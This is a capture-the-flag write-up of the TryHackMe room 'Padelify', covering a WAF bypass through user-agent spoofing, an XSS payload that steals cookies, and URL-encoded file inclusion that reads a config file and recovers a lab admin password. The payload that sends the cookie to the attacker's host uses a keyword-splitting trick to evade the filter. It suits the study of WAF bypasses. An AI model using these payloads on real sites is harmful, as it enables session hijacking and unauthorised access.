# :game_die: Padelify - THM Writeup. By: Kavin Jindal (@Klevr)

> **Original Source:** [Padelify - THM Writeup. By: Kavin Jindal (@Klevr)](https://infosecwriteups.com/padelify-thm-writeup-5f30dd31009f)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

By: Kavin Jindal (@Klevr)


## Get Avyukt Security’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


[https://tryhackme.com/room/padelify](https://tryhackme.com/room/padelify)


- Padelify is one of the latest rooms released by TryHackMe as a part of their recent releases related to WAF (Web Application Firewall) Exploitation. This room is a great introduction to learn about WAF bypasses and we will dive deep into every step of compromising the target in this room.

## -0x01: Initial Recon


- Following the usual route, I started with a TCP scan via Nmap and discovered the following ports

- 22 (SSH)
80 (HTTP)


```
nmap -sC -sV -p- 10.48.132.157
```


- The output of the scan is as follows


```
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp open http Apache httpd 2.4.58 ((Ubuntu))
| http-cookie-flags:
| /:
| PHPSESSID:
|_ httponly flag not set
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Padelify - Tournament Registration
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.33 seconds
```


- Next, I visited the webpage on the target at port 80.


- This seemed like a very basic registration page for some tournament.

- I tried to run a directory scan on the target via Gobuster but the WAF was blocking the requests with a 403 Forbidden error.

- I manually added a fake user-agent in GoBuster and successfully carried out the directory scan. This was the first instance of bypassing a firewall.


```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.48.132.157 -a "Mozilla/5.0 (Linux; Android 12; PSD-
AL00 Build/HUAWEIPSD-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36"
```


- You can use any legitimate-looking user agent just to evade the WAF filters.

- I found the following directories in the scan.


- `/logs` and `/config` seemed interesting directories.

- `/config` had an `app.conf` file that the WAF was restricting me from opening.

- `/logs` directory had the following `error.log`file.


- `error.log` had the following contents.


- If we check the error logs, then we can learn that there was an XSS attempt made previously. From this we can learn that the site is vulnerable to XSS and we can exploit it if we use the correct payload despite having a WAF.

- I went to the registration page and tried using XSS payloads.

- It was clearly written on the page that a moderator would approve our registration, hence we could attempt to steal moderator cookies and get elevated access.

## -0x02: WAF Bypass


- I first started an HTTP server on my attacker machine at port 8000.


```
python3 -m http.server 8000
```


- Next, I used the following payload to check for XSS.


```
<img src='http://10.48.79.213:8000/burp.json'>
```


- So basically, I had a `burp.json` file in my working directory and the above payload would execute in the moderator's page due to XSS which would send a GET request to my HTTP server. This was just to verify the vulnerability of XSS.


- After that, I tried several different payloads to steal moderator cookies and realized that
`<script>` tags are blocked
`cookie` word is specifically blocked
`<img>` tag with `onload` or `onerror` attribute is filtered too

- I even tried using HTML Entity Encoding on the payloads but they got detected by the WAF as well.

- Next, I tried using `<iframe>` tags along with `onload` attribute.


```
<iframe onload="new Image().src='http://10.48.79.213:1234?x='+document['coo'+'kie']">
```


- I used `document['coo'+'kie'` specifically to evade the WAF filtering out the term `cookie` . The above payload was injected to steal the moderator cookies and return them to my machine.


- As you can see, I had successfully stolen the moderator cookies using XSS which I could use to elevate my privileges.

- You can use several different variations of the XSS payload above. In some write-ups, you will see `<body>` tag being used instead of `<iframe>`.

- Now, I went to the Storage tab in Inspect elements and replaced the normal cookie with the moderator’s.


- I reloaded the page and I was redirected to the dashboard which revealed the first flag.


## -0x03: WAF Bypass to gain admin access


- I clicked on the Live link on the navigation bar from the dashboard.


- I was redirected to the page shown above.

- The link had a GET parameter `page` with the value as `match.php`. This instantly gave me an idea of trying out SSRF (Server-Side Request Forgery) on the target.

- I used a very generic `/etc/passwd` payload but it got flagged by the WAF.

- Next, I recollected seeing an `app.conf` file inside the `config` folder which I couldn't open due to WAF restrictions.

- I tried using `/config/app.conf` in the GET parameter and again got blocked by the firewall

- After that, I used URL encoding in Burp Suite as follows.


- I converted `/config/app.conf` to a URL encoded format and sent the request to which I got the following response.


- I had successfully evaded the firewall using a URL-encoded payload. Here you can see that there is `admin_info = "bL}8,S9W1o44"` .

- My first instinct was to test this as a password for the `admin` username on the `/login` page.


- And with that, I had successfully elevated to the admin user and obtained the final flag. This marked the completion of this room using several instances of bypassing the web app firewall.


I hope you found this write-up useful. Don’t forget to follow Avyukt Security for more quality cybersecurity content.


Happy Hacking!

---

*Originally published on [Medium](https://infosecwriteups.com/padelify-thm-writeup-5f30dd31009f). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
